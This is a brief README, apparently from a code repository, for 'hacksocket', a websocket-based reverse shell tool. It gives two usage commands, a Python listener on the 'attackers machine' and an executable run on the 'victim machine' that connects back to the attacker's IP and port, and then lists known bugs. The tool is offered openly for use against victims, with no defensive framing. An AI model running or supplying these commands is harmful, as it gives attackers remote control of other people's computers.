```
  _                _                   _        _ 
 | |              | |                 | |      | |
 | |__   __ _  ___| | _____  ___   ___| | _____| |_ 
 | '_ \ / _` |/ __| |/ / __|/ _ \ / __| |/ / _ \ __|
 | | | | (_| | (__|   <\__ \ (_) | (__|   <  __/ |_ 
 |_| |_|\__,_|\___|_|\_\___/\___/ \___|_|\_\___|\__|
```

A websocket based reverse shell tool for the less security minded.

# To use:

On the attackers machine use the python server

`python3 hacksock-srv.py --host [Listening IP] --port [Listening Port]`

On the victim machine, either alter the source so no arguments are required or run the below:

`hacksock.exe [attackers IP] [port]`

# Bugs:

- Code was written in a field therefore full of bugs
- The server accepts multiple connections however there is no way to switch at present. Functionality coming soon.
- Feel free to use and improve. #fixmycode
